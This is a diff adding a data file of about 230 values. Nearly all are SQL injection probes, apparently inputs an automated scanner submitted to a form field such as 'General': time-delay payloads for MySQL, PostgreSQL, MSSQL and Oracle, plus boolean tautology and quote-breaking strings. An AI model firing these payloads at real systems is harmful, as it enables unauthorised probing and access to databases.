@@ -1,0 +1,231 @@
+"(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'""+(select(0)from(select(sleep(15)))v)+""*/"
+"-1"" OR 2+142-142-1=0+0+0+1 -- "
+"-1"" OR 2+292-292-1=0+0+0+1 -- "
+"-1"" OR 2+360-360-1=0+0+0+1 -- "
+"-1"" OR 2+425-425-1=0+0+0+1 -- "
+"-1"" OR 2+455-455-1=0+0+0+1 -- "
+"-1"" OR 2+535-535-1=0+0+0+1 -- "
+"-1"" OR 2+583-583-1=0+0+0+1 -- "
+"-1"" OR 2+671-671-1=0+0+0+1 -- "
+"-1"" OR 2+789-789-1=0+0+0+1 -- "
+"-1"" OR 2+837-837-1=0+0+0+1 -- "
+"-1"" OR 2+934-934-1=0+0+0+1 -- "
+"-1"" OR 2+940-940-1=0+0+0+1 -- "
+"-1"" OR 2+984-984-1=0+0+0+1 -- "
+"-1"" OR 3+142-142-1=0+0+0+1 -- "
+"-1"" OR 3+292-292-1=0+0+0+1 -- "
+"-1"" OR 3+360-360-1=0+0+0+1 -- "
+"-1"" OR 3+425-425-1=0+0+0+1 -- "
+"-1"" OR 3+455-455-1=0+0+0+1 -- "
+"-1"" OR 3+535-535-1=0+0+0+1 -- "
+"-1"" OR 3+583-583-1=0+0+0+1 -- "
+"-1"" OR 3+671-671-1=0+0+0+1 -- "
+"-1"" OR 3+789-789-1=0+0+0+1 -- "
+"-1"" OR 3+837-837-1=0+0+0+1 -- "
+"-1"" OR 3+934-934-1=0+0+0+1 -- "
+"-1"" OR 3+940-940-1=0+0+0+1 -- "
+"-1"" OR 3+984-984-1=0+0+0+1 -- "
+"0""XOR(if(now()=sysdate(),sleep(15),0))XOR""Z"
+"0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
+"1'"""
+"General"" AND 2*3*8=6*8 AND ""aE6N""=""aE6N"
+"General"" AND 2*3*8=6*8 AND ""hC0P""=""hC0P"
+"General'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
+"General'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
+"GeneralInquiry'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
+"[""General""]"
+"if(now()=sysdate(),sleep(15),0)"
+-1 OR 2+139-139-1=0+0+0+1
+-1 OR 2+164-164-1=0+0+0+1 -- 
+-1 OR 2+176-176-1=0+0+0+1 -- 
+-1 OR 2+205-205-1=0+0+0+1 -- 
+-1 OR 2+234-234-1=0+0+0+1
+-1 OR 2+332-332-1=0+0+0+1 -- 
+-1 OR 2+334-334-1=0+0+0+1
+-1 OR 2+374-374-1=0+0+0+1
+-1 OR 2+374-374-1=0+0+0+1 -- 
+-1 OR 2+406-406-1=0+0+0+1 -- 
+-1 OR 2+407-407-1=0+0+0+1
+-1 OR 2+454-454-1=0+0+0+1 -- 
+-1 OR 2+521-521-1=0+0+0+1
+-1 OR 2+539-539-1=0+0+0+1
+-1 OR 2+559-559-1=0+0+0+1 -- 
+-1 OR 2+584-584-1=0+0+0+1 -- 
+-1 OR 2+605-605-1=0+0+0+1
+-1 OR 2+638-638-1=0+0+0+1 -- 
+-1 OR 2+672-672-1=0+0+0+1 -- 
+-1 OR 2+73-73-1=0+0+0+1
+-1 OR 2+743-743-1=0+0+0+1 -- 
+-1 OR 2+766-766-1=0+0+0+1
+-1 OR 2+796-796-1=0+0+0+1
+-1 OR 2+839-839-1=0+0+0+1
+-1 OR 2+851-851-1=0+0+0+1 -- 
+-1 OR 2+898-898-1=0+0+0+1
+-1 OR 2+920-920-1=0+0+0+1
+-1 OR 2+979-979-1=0+0+0+1
+-1 OR 3+139-139-1=0+0+0+1
+-1 OR 3+164-164-1=0+0+0+1 -- 
+-1 OR 3+176-176-1=0+0+0+1 -- 
+-1 OR 3+205-205-1=0+0+0+1 -- 
+-1 OR 3+234-234-1=0+0+0+1
+-1 OR 3+332-332-1=0+0+0+1 -- 
+-1 OR 3+334-334-1=0+0+0+1
+-1 OR 3+374-374-1=0+0+0+1
+-1 OR 3+374-374-1=0+0+0+1 -- 
+-1 OR 3+406-406-1=0+0+0+1 -- 
+-1 OR 3+407-407-1=0+0+0+1
+-1 OR 3+454-454-1=0+0+0+1 -- 
+-1 OR 3+521-521-1=0+0+0+1
+-1 OR 3+539-539-1=0+0+0+1
+-1 OR 3+559-559-1=0+0+0+1 -- 
+-1 OR 3+584-584-1=0+0+0+1 -- 
+-1 OR 3+605-605-1=0+0+0+1
+-1 OR 3+638-638-1=0+0+0+1 -- 
+-1 OR 3+672-672-1=0+0+0+1 -- 
+-1 OR 3+73-73-1=0+0+0+1
+-1 OR 3+743-743-1=0+0+0+1 -- 
+-1 OR 3+766-766-1=0+0+0+1
+-1 OR 3+796-796-1=0+0+0+1
+-1 OR 3+839-839-1=0+0+0+1
+-1 OR 3+851-851-1=0+0+0+1 -- 
+-1 OR 3+898-898-1=0+0+0+1
+-1 OR 3+920-920-1=0+0+0+1
+-1 OR 3+979-979-1=0+0+0+1
+-1' OR 2+165-165-1=0+0+0+1 -- 
+-1' OR 2+241-241-1=0+0+0+1 -- 
+-1' OR 2+251-251-1=0+0+0+1 -- 
+-1' OR 2+253-253-1=0+0+0+1 or '2Q2baGuK'='
+-1' OR 2+257-257-1=0+0+0+1 or 'WnLJyUja'='
+-1' OR 2+263-263-1=0+0+0+1 or '0HFo7rq9'='
+-1' OR 2+267-267-1=0+0+0+1 or 'F1IO2qJX'='
+-1' OR 2+27-27-1=0+0+0+1 or 'zYlMswKX'='
+-1' OR 2+387-387-1=0+0+0+1 or 'AKhoDLWn'='
+-1' OR 2+401-401-1=0+0+0+1 -- 
+-1' OR 2+411-411-1=0+0+0+1 -- 
+-1' OR 2+416-416-1=0+0+0+1 or 'GhuyFGN6'='
+-1' OR 2+507-507-1=0+0+0+1 -- 
+-1' OR 2+529-529-1=0+0+0+1 -- 
+-1' OR 2+541-541-1=0+0+0+1 or 'z3EHFuCF'='
+-1' OR 2+578-578-1=0+0+0+1 -- 
+-1' OR 2+591-591-1=0+0+0+1 -- 
+-1' OR 2+672-672-1=0+0+0+1 -- 
+-1' OR 2+706-706-1=0+0+0+1 or 'GqRohERC'='
+-1' OR 2+750-750-1=0+0+0+1 or 'dqTAqLUT'='
+-1' OR 2+760-760-1=0+0+0+1 -- 
+-1' OR 2+78-78-1=0+0+0+1 or '0fsH1pJr'='
+-1' OR 2+787-787-1=0+0+0+1 -- 
+-1' OR 2+95-95-1=0+0+0+1 or 'O3Bb31QM'='
+-1' OR 2+967-967-1=0+0+0+1 or 'OEcxtpvt'='
+-1' OR 3+165-165-1=0+0+0+1 -- 
+-1' OR 3+241-241-1=0+0+0+1 -- 
+-1' OR 3+251-251-1=0+0+0+1 -- 
+-1' OR 3+253-253-1=0+0+0+1 or '2Q2baGuK'='
+-1' OR 3+257-257-1=0+0+0+1 or 'WnLJyUja'='
+-1' OR 3+263-263-1=0+0+0+1 or '0HFo7rq9'='
+-1' OR 3+267-267-1=0+0+0+1 or 'F1IO2qJX'='
+-1' OR 3+27-27-1=0+0+0+1 or 'zYlMswKX'='
+-1' OR 3+387-387-1=0+0+0+1 or 'AKhoDLWn'='
+-1' OR 3+401-401-1=0+0+0+1 -- 
+-1' OR 3+411-411-1=0+0+0+1 -- 
+-1' OR 3+416-416-1=0+0+0+1 or 'GhuyFGN6'='
+-1' OR 3+507-507-1=0+0+0+1 -- 
+-1' OR 3+529-529-1=0+0+0+1 -- 
+-1' OR 3+541-541-1=0+0+0+1 or 'z3EHFuCF'='
+-1' OR 3+578-578-1=0+0+0+1 -- 
+-1' OR 3+591-591-1=0+0+0+1 -- 
+-1' OR 3+672-672-1=0+0+0+1 -- 
+-1' OR 3+706-706-1=0+0+0+1 or 'GqRohERC'='
+-1' OR 3+750-750-1=0+0+0+1 or 'dqTAqLUT'='
+-1' OR 3+760-760-1=0+0+0+1 -- 
+-1' OR 3+78-78-1=0+0+0+1 or '0fsH1pJr'='
+-1' OR 3+787-787-1=0+0+0+1 -- 
+-1' OR 3+95-95-1=0+0+0+1 or 'O3Bb31QM'='
+-1' OR 3+967-967-1=0+0+0+1 or 'OEcxtpvt'='
+1 waitfor delay '0:0:15' -- 
+1ET92DVIO
+1Y1pOjAd') OR 626=(SELECT 626 FROM PG_SLEEP(15))--
+2QKfmP8n' OR 728=(SELECT 728 FROM PG_SLEEP(15))--
+2qkdJm83') OR 393=(SELECT 393 FROM PG_SLEEP(15))--
+3Tzk8wl7' OR 148=(SELECT 148 FROM PG_SLEEP(15))--
+4V5XyqzL'; waitfor delay '0:0:15' -- 
+4yRtkpjK')) OR 355=(SELECT 355 FROM PG_SLEEP(15))--
+6kkYbrUu') OR 447=(SELECT 447 FROM PG_SLEEP(15))--
+7eH9PRAE' OR 759=(SELECT 759 FROM PG_SLEEP(15))--
+8zxyQozj'; waitfor delay '0:0:15' -- 
+9GimuH8Z')) OR 150=(SELECT 150 FROM PG_SLEEP(15))--
+@@1iLjr
+@@2QW52
+@@Bu5Yn
+@@D1lyN
+@@DuQ15
+@@HyNnx
+@@JD251
+@@L4R9r
+@@LFxIX
+@@MFvfj
+@@PdV3C
+@@blj9M
+@@gjDSR
+@@oVmPA
+@@qGKWf
+@@qwXx0
+ALvr2wNN') OR 354=(SELECT 354 FROM PG_SLEEP(15))--
+B306m2nG')) OR 736=(SELECT 736 FROM PG_SLEEP(15))--
+CHf29BAl' OR 900=(SELECT 900 FROM PG_SLEEP(15))--
+Em4pWTgT' OR 561=(SELECT 561 FROM PG_SLEEP(15))--
+FwbFOfls') OR 812=(SELECT 812 FROM PG_SLEEP(15))--
+GBmSKIFX') OR 213=(SELECT 213 FROM PG_SLEEP(15))--
+General%' AND 2*3*8=6*8 AND 'OjGX'!='OjGX%
+General%' AND 2*3*8=6*8 AND 'xe22'!='xe22%
+General' AND 2*3*8=6*8 AND 'Ez66'='Ez66
+General' AND 2*3*8=6*8 AND 'RK8I'='RK8I
+General'||'
+General'||'
+General;
+GgTbTTeK
+Gnaf9cGY' OR 364=(SELECT 364 FROM PG_SLEEP(15))--
+GniXjums')) OR 11=(SELECT 11 FROM PG_SLEEP(15))--
+IIbTkZNM')) OR 657=(SELECT 657 FROM PG_SLEEP(15))--
+IT2tt8OS'; waitfor delay '0:0:15' -- 
+IerwABuk')) OR 738=(SELECT 738 FROM PG_SLEEP(15))--
+JBTlZClC')) OR 322=(SELECT 322 FROM PG_SLEEP(15))--
+JgS8vnwM') OR 502=(SELECT 502 FROM PG_SLEEP(15))--
+L5vDY7Dk'; waitfor delay '0:0:15' -- 
+M1I8lgZm')) OR 515=(SELECT 515 FROM PG_SLEEP(15))--
+MnAhAq70' OR 361=(SELECT 361 FROM PG_SLEEP(15))--
+MnLJIRC4')) OR 654=(SELECT 654 FROM PG_SLEEP(15))--
+N0x5ualK'; waitfor delay '0:0:15' -- 
+N5iBihp1') OR 299=(SELECT 299 FROM PG_SLEEP(15))--
+PkzxuWgi'; waitfor delay '0:0:15' -- 
+Q4rrPnA4' OR 778=(SELECT 778 FROM PG_SLEEP(15))--
+ROAQJwfA'; waitfor delay '0:0:15' -- 
+RUIXvPC8' OR 249=(SELECT 249 FROM PG_SLEEP(15))--
+S4fvVrix') OR 337=(SELECT 337 FROM PG_SLEEP(15))--
+SRriRRK6'; waitfor delay '0:0:15' -- 
+SpN6O2Cy') OR 539=(SELECT 539 FROM PG_SLEEP(15))--
+Tx3PuJbT')) OR 480=(SELECT 480 FROM PG_SLEEP(15))--
+YSVG2oK1'; waitfor delay '0:0:15' -- 
+apqL45no
+dvHwFw2E') OR 207=(SELECT 207 FROM PG_SLEEP(15))--
+fTxLVqcT'; waitfor delay '0:0:15' -- 
+g0tCT9Lw'; waitfor delay '0:0:15' -- 
+gBXRB7ki' OR 623=(SELECT 623 FROM PG_SLEEP(15))--
+gYOo52eC')) OR 201=(SELECT 201 FROM PG_SLEEP(15))--
+gg15RyA1') OR 140=(SELECT 140 FROM PG_SLEEP(15))--
+hA2GpJgo')) OR 602=(SELECT 602 FROM PG_SLEEP(15))--
+hxUcRlQN'; waitfor delay '0:0:15' -- 
+hxdfwLhR' OR 292=(SELECT 292 FROM PG_SLEEP(15))--
+iRKhJJGc') OR 463=(SELECT 463 FROM PG_SLEEP(15))--
+k8KegsHX' OR 68=(SELECT 68 FROM PG_SLEEP(15))--
+mlIrGqxT' OR 209=(SELECT 209 FROM PG_SLEEP(15))--
+nb8junxP'; waitfor delay '0:0:15' -- 
+oCTjFNqG') OR 567=(SELECT 567 FROM PG_SLEEP(15))--
+pcK0e8C9'; waitfor delay '0:0:15' -- 
+q11MEShg')) OR 610=(SELECT 610 FROM PG_SLEEP(15))--
+q29Z5f8X')) OR 769=(SELECT 769 FROM PG_SLEEP(15))--
+rFLm6pWm')) OR 66=(SELECT 66 FROM PG_SLEEP(15))--
+swyjhFvj' OR 926=(SELECT 926 FROM PG_SLEEP(15))--
+v0mXLm8P
+vIkABwqt' OR 113=(SELECT 113 FROM PG_SLEEP(15))--
+wYgFBhQC') OR 250=(SELECT 250 FROM PG_SLEEP(15))--
+wsYi5oAf'; waitfor delay '0:0:15' -- 
